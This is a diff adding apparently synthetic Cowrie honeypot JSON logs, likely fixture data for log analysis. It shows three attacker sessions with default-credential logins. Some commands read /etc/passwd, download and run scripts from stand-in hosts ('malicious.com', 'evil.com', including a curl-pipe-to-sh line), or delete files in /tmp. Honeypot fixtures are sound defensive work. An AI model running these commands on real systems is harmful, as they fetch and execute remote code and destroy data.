@@ -1,0 +1,22 @@
+{"eventid":"cowrie.session.connect","timestamp":"2024-01-01T10:00:00Z","src_ip":"192.168.1.10","session":"sess1"}
+{"eventid":"cowrie.login.success","timestamp":"2024-01-01T10:00:02Z","username":"root","password":"1234","session":"sess1"}
+{"eventid":"cowrie.command.input","timestamp":"2024-01-01T10:00:05Z","input":"uname -a","session":"sess1"}
+{"eventid":"cowrie.command.input","timestamp":"2024-01-01T10:00:06Z","input":"cat /etc/passwd","session":"sess1"}
+{"eventid":"cowrie.command.input","timestamp":"2024-01-01T10:00:08Z","input":"wget http://malicious.com/bot.sh","session":"sess1"}
+{"eventid":"cowrie.command.input","timestamp":"2024-01-01T10:00:10Z","input":"chmod +x bot.sh","session":"sess1"}
+{"eventid":"cowrie.command.input","timestamp":"2024-01-01T10:00:12Z","input":"./bot.sh","session":"sess1"}
+{"eventid":"cowrie.session.closed","timestamp":"2024-01-01T10:00:20Z","session":"sess1"}
+
+{"eventid":"cowrie.session.connect","timestamp":"2024-01-01T11:00:00Z","src_ip":"45.12.33.21","session":"sess2"}
+{"eventid":"cowrie.login.success","timestamp":"2024-01-01T11:00:03Z","username":"admin","password":"admin","session":"sess2"}
+{"eventid":"cowrie.command.input","timestamp":"2024-01-01T11:00:05Z","input":"ls -la","session":"sess2"}
+{"eventid":"cowrie.command.input","timestamp":"2024-01-01T11:00:06Z","input":"ps aux","session":"sess2"}
+{"eventid":"cowrie.command.input","timestamp":"2024-01-01T11:00:07Z","input":"netstat -an","session":"sess2"}
+{"eventid":"cowrie.session.closed","timestamp":"2024-01-01T11:00:10Z","session":"sess2"}
+
+{"eventid":"cowrie.session.connect","timestamp":"2024-01-01T12:00:00Z","src_ip":"103.44.55.66","session":"sess3"}
+{"eventid":"cowrie.login.success","timestamp":"2024-01-01T12:00:02Z","username":"user","password":"pass","session":"sess3"}
+{"eventid":"cowrie.command.input","timestamp":"2024-01-01T12:00:04Z","input":"curl http://evil.com/shell.sh | sh","session":"sess3"}
+{"eventid":"cowrie.command.input","timestamp":"2024-01-01T12:00:06Z","input":"rm -rf /tmp/*","session":"sess3"}
+{"eventid":"cowrie.command.input","timestamp":"2024-01-01T12:00:08Z","input":"echo hacked","session":"sess3"}
+{"eventid":"cowrie.session.closed","timestamp":"2024-01-01T12:00:12Z","session":"sess3"}
